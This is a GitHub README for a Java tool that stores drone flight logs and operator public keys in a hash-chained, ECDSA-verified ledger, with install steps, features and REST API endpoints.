# 🚁 drones-privacy-ledger - Secure Your Drone Data Effortlessly

[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/arbifajar/drones-privacy-ledger/releases)

## 📜 Introduction

The drones-privacy-ledger is a Java-based application designed to secure your drone flight logs and operator IDs. It utilizes a hash-chained ledger and ECDSA signature verification, allowing you to keep your data safe without needing to rely on cloud services. This project is perfect for users who want an auditable and tamper-evident ledger in a lightweight package.

## 🚀 Getting Started

To get started with the drones-privacy-ledger, follow these steps to download and run the application on your local machine.

## 📥 Download & Install

1. **Visit the Releases Page**  
   Go to our [Releases page](https://github.com/arbifajar/drones-privacy-ledger/releases) to download the latest version of the drones-privacy-ledger.

2. **Select the Latest Release**  
   Once you are on the Releases page, scroll down to find the latest release. You should see files available for download.

3. **Download the Application**  
   Click on the download link for the appropriate file for your operating system. The available options may include:
   - Windows: `drones-privacy-ledger.exe`
   - Mac: `drones-privacy-ledger.dmg`
   - Linux: `drones-privacy-ledger.jar`

4. **Install the Application**  
   Follow the installation instructions specific to your file type:
   - For `.exe` and `.dmg`, double-click the file and follow the prompts to install.
   - For `.jar`, ensure you have Java installed, then run it using the command:
     ```
     java -jar drones-privacy-ledger.jar
     ```

## 🔧 System Requirements

Ensure your system meets the following minimum requirements:

- **Java Version**: Java 11 or higher
- **Operating System**: Compatible with Windows, Mac, and Linux
- **RAM**: At least 4 GB

## 📈 Features

- **Operator Registration**: Easily register using PEM public keys (ECDSA).
- **Flight Log Submission**: Submit signed flight logs with secure on-chain anchoring.
- **Integrity Verification**: Use the verification endpoint to ensure your logs are intact.
- **Database**: H2 file-based database, no external dependencies required.
- **REST API**: Access a clean REST API, complete with curl examples and a Postman collection.
- **Future Upgrade Path**: An upgrade path to integrate with Hyperledger Fabric for more extensive networks.

## 🔄 Data Flow

Here is how the data flows within the application:

1. **Operator Registration**: The operator registers with their ECDSA public key.
2. **Flight Log Submission**: The operator submits signed flight logs, with secure anchoring to the ledger.
3. **Verification**: Users can call the integrity verification endpoint to check the full chain.

## 📊 API Usage

To interact with the drones-privacy-ledger, you can use various endpoints of the REST API. Here are a few examples:

- **Register an Operator**: `POST /api/operators`
- **Submit a Flight Log**: `POST /api/flights`
- **Verify Log Integrity**: `GET /api/verify`

You can test these API endpoints using tools like Postman.

## 🛠️ Troubleshooting

If you encounter issues while running the application, please consider the following:

- **Java Issues**: Ensure your Java installation is correct and properly configured in your system PATH.
- **File Permissions**: Run your application with appropriate permissions, especially in restricted environments.

## 📚 Further Documentation

For more details on features, data models, and technical explanations, check our comprehensive [documentation](https://github.com/arbifajar/drones-privacy-ledger/docs).

## 📞 Support

For support, please raise an issue on the GitHub Issues page or contact us via our support email.

## ⚖️ License

This project is licensed under the MIT License. See the [LICENSE](https://github.com/arbifajar/drones-privacy-ledger/LICENSE) file for details.

---

For any questions, please visit our [Releases page](https://github.com/arbifajar/drones-privacy-ledger/releases) and download the application.